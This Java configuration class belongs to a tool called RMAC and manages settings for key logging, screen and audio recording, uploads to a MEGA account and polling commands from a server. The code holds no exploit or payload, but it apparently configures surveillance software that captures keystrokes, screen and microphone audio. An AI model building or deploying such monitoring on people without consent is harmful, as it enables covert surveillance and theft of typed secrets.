package com.rmac.core;

import com.rmac.utils.Constants;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.IOException;
import java.io.PrintWriter;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.TimeUnit;
import java.util.function.BiConsumer;
import lombok.extern.slf4j.Slf4j;

/**
 * Provides an interface for persistent read/write operation on RMAC host config file (config.rmac),
 * also acts as a central config store when RMAC is running.
 * <br>
 * <br>
 * Configuration properties:
 * <br>
 * <pre>
 * <code>ServerUrl</code>                ("")         - RMAC Server URL.
 * <code>MegaUser</code>                 ("")         - Username for MEGA account.
 * <code>MegaPass</code>                 ("")         - Password for MEGA account.
 * <code>VideoDuration</code>            (600000)     - Duration for screen recordings in milliseconds.
 * <code>FPS</code>                      (20)         - Framerate for screen recordings.
 * <code>KeyLogUploadInterval</code>     (600000)     - Interval for uploads of key-log output.
 * <code>HostName</code>                 ("")         - Name of the host machine.
 * <code>ClientName</code>               ("")         - Display name given to the host.
 * <code>ClientId</code>                 ("")         - Unique identifier for this host machine.
 * <code>Runtime</code>                  ("")         - Path to the java runtime.
 * <code>LogFileUpload</code>            (true)       - Switch to on/off uploads of key-logs.
 * <code>VideoUpload</code>              (true)       - Switch to on/off uploads of screen recordings.
 * <code>MaxStagingSize</code>           (157286400)  - Size limit for staging directories in bytes.
 * <code>MaxStorageSize</code>           (2147483648) - Size limit to store pending uploads in bytes.
 * <code>MaxParallelUploads</code>       (3)          - No. of files that can be uploaded in parallel.
 * <code>FetchCommandPollInterval</code> (5000)       - Polling interval for fetching commands from
 *                                         RMAC Server in milliseconds..
 * <code>ScreenRecording</code>          (true)       - Enable or disable screen recording.
 * <code>AudioRecording</code>           (true)       - Enable or disable audio recording.
 * <code>ActiveAudioRecording</code>     (false)      - Enable or disable active (always-on) audio
 *                                         recording, passive recording monitors default
 *                                         microphone usage by any other program and
 *                                         records only if its being used.
 * <code>KeyLog</code>                   (true)       - Enable or disable key logging.
 * </pre>
 */
@Slf4j
public class Config {

  private String serverUrl;
  private String megaUser;
  private String megaPass;
  private int videoDuration;
  private int fps;
  private int keyLogUploadInterval;
  private String hostName;
  private String clientName;
  private String clientId;
  private boolean logFileUpload;
  private boolean videoUpload;
  private long maxStagingSize;
  private long maxStorageSize;
  private int fetchCommandPollInterval;
  private int maxParallelUploads;
  private boolean screenRecording;
  private boolean audioRecording;
  private boolean activeAudioRecording;
  private boolean keyLogging;
  private int clientHealthCheckInterval;

  private final List<BiConsumer<String, String>> listeners = new ArrayList<>();

  public Config() {
    this.serverUrl = "";
    this.megaUser = "";
    this.megaPass = "";
    this.videoDuration = 600000;
    this.fps = 20;
    this.keyLogUploadInterval = 600000;
    this.hostName = "";
    this.clientName = "";
    this.clientId = "";
    this.logFileUpload = true;
    this.videoUpload = true;
    this.maxStagingSize = 157286400L;
    this.maxStorageSize = 2147483648L;
    this.fetchCommandPollInterval = 5000;
    this.maxParallelUploads = 3;
    this.screenRecording = true;
    this.keyLogging = true;
    this.audioRecording = true;
    this.activeAudioRecording = false;
    this.clientHealthCheckInterval = 3000;
  }

  /**
   * Read the RMAC configuration file (config.rmac) and load the values to their respective
   * variables.
   *
   * @throws IOException when config file cannot be read.
   */
  public void loadConfig() throws IOException {
    File configFile = new File(Constants.CONFIG_LOCATION);

    if (configFile.exists()) {
      BufferedReader configReader = new BufferedReader(new FileReader(configFile));
      String curr;
      StringBuilder multiline = new StringBuilder();
      while ((curr = configReader.readLine()) != null) {
        if (curr.contains("=")) {
          String[] pair = curr.trim().split("=");
          this.setProperty(pair[0].trim(), pair[1].trim(), false);
        } else if (curr.contains("/#")) {
          String key = curr.replace("/#", "");
          while (!(curr = configReader.readLine().trim()).contains("#/")) {
            multiline.append(curr).append(" ");
          }
          this.setProperty(key.trim(), multiline.toString().trim(), false);
          multiline = new StringBuilder();
        }
      }
      configReader.close();
    }
  }

  /**
   * Parse and set the configuration property, optionally persist the config change to config
   * file.
   *
   * @param key     The name of the configuration property as defined in the config file.
   * @param value   The value to be parsed and set.
   * @param persist Whether to write this config back to config.rmac file, so that RMAC remembers
   *                the config when it re-boots.
   */
  public void setProperty(String key, String value, boolean persist) {
    switch (key) {
      case "ServerUrl": {
        this.serverUrl = value;
        break;
      }
      case "MegaUser": {
        this.megaUser = value;
        break;
      }
      case "MegaPass": {
        this.megaPass = value;
        break;
      }
      case "VideoDuration": {
        this.videoDuration = Integer.parseInt(value);
        break;
      }
      case "FPS": {
        this.fps = Integer.parseInt(value);
        break;
      }
      case "KeyLogUploadInterval": {
        this.keyLogUploadInterval = Integer.parseInt(value);
        break;
      }
      case "HostName": {
        this.hostName = value;
        break;
      }
      case "ClientName": {
        this.clientName = value;
        break;
      }
      case "ClientId": {
        this.clientId = value;
        break;
      }
      case "LogFileUpload": {
        this.logFileUpload = Boolean.parseBoolean(value);
        break;
      }
      case "VideoUpload": {
        this.videoUpload = Boolean.parseBoolean(value);
        break;
      }
      case "MaxStagingSize": {
        this.maxStagingSize = Long.parseLong(value);
        break;
      }
      case "MaxStorageSize": {
        this.maxStorageSize = Long.parseLong(value);
        break;
      }
      case "MaxParallelUploads": {
        this.maxParallelUploads = Integer.parseInt(value);
        break;
      }
      case "FetchCommandPollInterval": {
        this.fetchCommandPollInterval = Integer.parseInt(value);
        break;
      }
      case "ClientHealthCheckInterval": {
        this.clientHealthCheckInterval = Integer.parseInt(value);
        break;
      }
      case "ScreenRecording": {
        this.screenRecording = Boolean.parseBoolean(value);
        break;
      }
      case "AudioRecording": {
        this.audioRecording = Boolean.parseBoolean(value);
        break;
      }
      case "ActiveAudioRecording": {
        this.activeAudioRecording = Boolean.parseBoolean(value);
        break;
      }
      case "KeyLog": {
        this.keyLogging = Boolean.parseBoolean(value);
        break;
      }
      default:
        break;
    }

    if (persist) {
      this.updateConfig();
    }
    this.listeners.forEach((listener) -> listener.accept(key, value));
    log.info("Config Loaded: " + key + " - " + value);
  }

  /**
   * Set the RMAC Server URL
   *
   * @param value The URL
   */
  public void setServerUrl(String value) {
    this.serverUrl = value;
    this.updateConfig();
    this.listeners.forEach(listener -> listener.accept("ServerUrl", value));
  }

  /**
   * Set the username for MEGA account.
   *
   * @param value The MEGA username
   */
  public void setMegaUser(String value) {
    this.megaUser = value;
    this.updateConfig();
    this.listeners.forEach((listener) -> listener.accept("MegaUser", value));
  }

  /**
   * Set the MEGA account password.
   *
   * @param value The MEGA password
   */
  public void setMegaPass(String value) {
    this.megaPass = value;
    this.updateConfig();
    this.listeners.forEach((listener) -> listener.accept("MegaPass", value));
  }

  /**
   * Set the duration for screen recordings.
   *
   * @param duration The duration in milliseconds
   */
  public void setVideoDuration(int duration) {
    this.videoDuration = duration;
    this.updateConfig();
    this.listeners.forEach(
        (listener) -> listener.accept("VideoDuration", String.valueOf(duration)));
  }

  /**
   * Set the framerate for screen recordings.
   *
   * @param fps The framerate in frames/sec
   */
  public void setFPS(int fps) {
    this.fps = fps;
    this.updateConfig();
    this.listeners.forEach(
        (listener) -> listener.accept("FPS", String.valueOf(fps)));
  }

  /**
   * Set the upload interval for key-log output file.
   *
   * @param interval The interval in milliseconds.
   */
  public void setKeyLogUploadInterval(int interval) {
    this.keyLogUploadInterval = interval;
    this.updateConfig();
    this.listeners.forEach(
        (listener) -> listener.accept("KeyLogUploadInterval", String.valueOf(interval)));
  }

  /**
   * Set the host name for this machine.
   *
   * @param name The host name.
   */
  public void setHostName(String name) {
    this.hostName = name;
    this.updateConfig();
    this.listeners.forEach(
        (listener) -> listener.accept("HostName", name));
  }

  /**
   * Set the display name for this host.
   *
   * @param name The display name.
   */
  public void setClientName(String name) {
    this.clientName = name;
    this.updateConfig();
    this.listeners.forEach(
        (listener) -> listener.accept("ClientName", name));
  }

  /**
   * Set the unique identifier for this host machine.
   *
   * @param clientId The unique Id.
   */
  public void setClientId(String clientId) {
    this.clientId = clientId;
    this.updateConfig();
    this.listeners.forEach(
        (listener) -> listener.accept("ClientId", clientId));
  }

  /**
   * Sets whether the key-log output files needs to uploaded or not.
   *
   * @param flag The switch (true=upload-on | false=upload-off).
   */
  public void setLogFileUpload(boolean flag) {
    this.logFileUpload = flag;
    this.updateConfig();
    this.listeners.forEach(
        (listener) -> listener.accept("LogFileUpload", String.valueOf(flag)));
  }

  /**
   * Sets whether the screen recordings needs to be uploaded or not.
   *
   * @param flag The switch (true=upload-on | false=upload-off).
   */
  public void setVideoUpload(boolean flag) {
    this.videoUpload = flag;
    this.updateConfig();
    this.listeners.forEach(
        (listener) -> listener.accept("VideoUpload", String.valueOf(flag)));
  }

  /**
   * Set the interval for fetch-polling commands from RMAC Server.
   *
   * @param interval The interval in milliseconds.
   */
  public void setFetchCommandPollInterval(int interval) {
    this.fetchCommandPollInterval = interval;
    this.updateConfig();
    this.listeners.forEach(
        (listener) -> listener.accept("FetchCommandPollInterval", String.valueOf(interval)));
  }

  /**
   * Set the interval for updater -> client health-check.
   *
   * @param interval The interval in milliseconds.
   */
  public void setClientHealthCheckInterval(int interval) {
    this.clientHealthCheckInterval = interval;
    this.updateConfig();
    this.listeners.forEach(
        listener -> listener.accept("ClientHealthCheckInterval", String.valueOf(interval)));
  }

  /**
   * Set the maximum size for the staging directories.
   *
   * @param size The size in bytes.
   */
  public void setMaxStagingSize(long size) {
    this.maxStagingSize = size;
    this.updateConfig();
    this.listeners.forEach(
        (listener) -> listener.accept("MaxStagingSize", String.valueOf(size)));
  }

  /**
   * Set the total size RMAC can use when buffering pending files that needs to be uploaded later
   * (possibly when upload switches are on or network is up or both).
   *
   * @param size The size in bytes.
   */
  public void setMaxStorageSize(long size) {
    this.maxStorageSize = size;
    this.updateConfig();
    this.listeners.forEach(
        (listener) -> listener.accept("MaxStorageSize", String.valueOf(size)));
  }

  /**
   * Set the maximum number of files that can be uploaded in parallel.
   *
   * @param value The number of parallel file uploads.
   */
  public void setMaxParallelUploads(int value) {
    this.maxParallelUploads = value;
    this.updateConfig();
    this.listeners.forEach(
        (listener) -> listener.accept("MaxParallelUploads", String.valueOf(value)));
  }

  /**
   * Enable or disable screen recording
   *
   * @param flag The switch (true=enable | false=disable)
   */
  public void setScreenRecording(boolean flag) {
    this.screenRecording = flag;
    this.updateConfig();
    this.listeners.forEach(
        (listener) -> listener.accept("ScreenRecording", String.valueOf(flag)));
  }

  /**
   * Enable or disable audio recording when recording video, this config will be ignored if screen
   * recording is disabled.
   *
   * @param flag The switch (true=enable | false=disable)
   */
  public void setAudioRecording(boolean flag) {
    this.audioRecording = flag;
    this.updateConfig();
    this.listeners.forEach(listener -> listener.accept("AudioRecording", String.valueOf(flag)));
  }

  /**
   * Set state of audio recording activeness, setting this state to true will cause RMAC to record
   * audio at all times, false (passive audio recording) is the default value, which records audio
   * only when its being used by any other program.
   *
   * @param flag The switch (true=active | false=passive)
   */
  public void setActiveAudioRecording(boolean flag) {
    this.activeAudioRecording = flag;
    this.updateConfig();
    this.listeners.forEach(
        listener -> listener.accept("ActiveAudioRecording", String.valueOf(flag)));
  }

  /**
   * Enable or disable key logging.
   *
   * @param flag The switch (true=enable | false=disable)
   */
  public void setKeyLogging(boolean flag) {
    this.keyLogging = flag;
    this.updateConfig();
    this.listeners.forEach(
        (listener) -> listener.accept("KeyLog", String.valueOf(flag)));
  }

  /**
   * Get the RMAC Server URL
   *
   * @return The RMAC Server URL
   */
  public String getServerUrl() {
    return this.serverUrl;
  }

  /**
   * Get the MEGA username
   *
   * @return The MEGA account username
   */
  public String getMegaUser() {
    return this.megaUser;
  }

  /**
   * Get the MEGA password
   *
   * @return The MEGA account password
   */
  public String getMegaPass() {
    return this.megaPass;
  }

  /**
   * Get the currently configured screen recording duration.
   *
   * @return Screen recording duration in milliseconds.
   */
  public int getVideoDuration() {
    return this.videoDuration;
  }

  /**
   * Get the configured screen recording duration in time format (hh:mm:ss).
   *
   * @return The time formatted screen recording duration.
   */
  public String getVideoDurationFormatted() {
    return String.format("%02d:%02d:%02d", TimeUnit.MILLISECONDS.toHours(this.videoDuration),
        TimeUnit.MILLISECONDS.toMinutes(this.videoDuration) % TimeUnit.HOURS.toMinutes(1),
        TimeUnit.MILLISECONDS.toSeconds(this.videoDuration) % TimeUnit.MINUTES.toSeconds(1));
  }

  /**
   * Get the configured framerate for screen recording.
   *
   * @return The framerate in frames/sec.
   */
  public int getFPS() {
    return this.fps;
  }

  /**
   * Get the configured interval for key-log output file uploads.
   *
   * @return The interval in milliseconds.
   */
  public int getKeyLogUploadInterval() {
    return this.keyLogUploadInterval;
  }

  /**
   * Get the configured name of the host machine.
   *
   * @return The host machine name.
   */
  public String getHostName() {
    return this.hostName;
  }

  /**
   * Get the configured host machine display name.
   *
   * @return The display name for the host.
   */
  public String getClientName() {
    return this.clientName;
  }

  /**
   * Get the unique identifier for the host machine.
   *
   * @return The unique id.
   */
  public String getClientId() {
    return this.clientId;
  }

  /**
   * Get the configured flag for key-log uploads.
   *
   * @return The switch (true=upload-on | false=upload-off).
   */
  public boolean getLogFileUpload() {
    return this.logFileUpload;
  }

  /**
   * Get the configured flag for screen recordings uploads.
   *
   * @return The switch (true=upload-on | false=upload-off).
   */
  public boolean getVideoUpload() {
    return this.videoUpload;
  }

  /**
   * Get configured poll interval for fetching commands from RMAC Server to be executed on this host
   * machine.
   *
   * @return The interval in milliseconds.
   */
  public int getFetchCommandPollInterval() {
    return this.fetchCommandPollInterval;
  }

  /**
   * Get the configured interval for health-check pings from RMAC Updater to RMAC Client.
   *
   * @return The interval in milliseconds.
   */
  public int getClientHealthCheckInterval() {
    return this.clientHealthCheckInterval;
  }

  /**
   * Get the configured max size of staging directories.
   *
   * @return The size in bytes.
   */
  public long getMaxStagingSize() {
    return this.maxStagingSize;
  }

  /**
   * Get the configured max storage size RMAC can use for buffering upload-pending
   * key-logs/recordings.
   *
   * @return The size in bytes.
   */
  public long getMaxStorageSize() {
    return this.maxStorageSize;
  }

  /**
   * Returns whether screen recording is enabled or disabled.
   *
   * @return The switch.
   */
  public boolean getScreenRecording() {
    return this.screenRecording;
  }

  /**
   * Returns whether audio recording is enabled or disabled.
   *
   * @return The switch
   */
  public boolean getAudioRecording() {
    return this.audioRecording;
  }

  /**
   * Returns whether audio recording is set to active or passive.
   *
   * @return The switch
   */
  public boolean getActiveAudioRecording() {
    return this.activeAudioRecording;
  }

  /**
   * Returns whether key logging is enabled or disabled.
   *
   * @return The switch.
   */
  public boolean getKeyLogging() {
    return this.keyLogging;
  }

  /**
   * Get the configured no. of parallel file uploads.
   *
   * @return The no. of parallel file uploads RMAC can perform.
   */
  public int getMaxParallelUploads() {
    return this.maxParallelUploads;
  }

  /**
   * Persist the entire config state from application to the config file (config.rmac).
   */
  public void updateConfig() {
    File configFile = new File(Constants.CONFIG_LOCATION);
    try {
      PrintWriter writer = new PrintWriter(configFile);
      writer.println("ServerUrl=" + this.serverUrl);
      writer.println("MegaUser=" + this.megaUser);
      writer.println("MegaPass=" + this.megaPass);
      writer.println("VideoDuration=" + this.videoDuration);
      writer.println("FPS=" + this.fps);
      writer.println("KeyLogUploadInterval=" + this.keyLogUploadInterval);
      writer.println("HostName=" + this.hostName);
      writer.println("ClientName=" + this.clientName);
      writer.println("ClientId=" + this.clientId);
      writer.println("LogFileUpload=" + this.logFileUpload);
      writer.println("VideoUpload=" + this.videoUpload);
      writer.println("MaxStagingSize=" + this.maxStagingSize);
      writer.println("MaxStorageSize=" + this.maxStorageSize);
      writer.println("MaxParallelUploads=" + this.maxParallelUploads);
      writer.println("FetchCommandPollInterval=" + this.fetchCommandPollInterval);
      writer.println("ClientHealthCheckInterval=" + this.clientHealthCheckInterval);
      writer.println("ScreenRecording=" + this.screenRecording);
      writer.println("AudioRecording=" + this.audioRecording);
      writer.println("ActiveAudioRecording=" + this.activeAudioRecording);
      writer.println("KeyLog=" + this.keyLogging);

      writer.flush();
      writer.close();
    } catch (FileNotFoundException e) {
      log.error("Could not update config file", e);
    }
  }

  /**
   * Register a config change listener.
   * @param callback the callback method to be called when any config property changes.
   */
  public void onChange(BiConsumer<String, String> callback) {
    this.listeners.add(callback);
  }
}
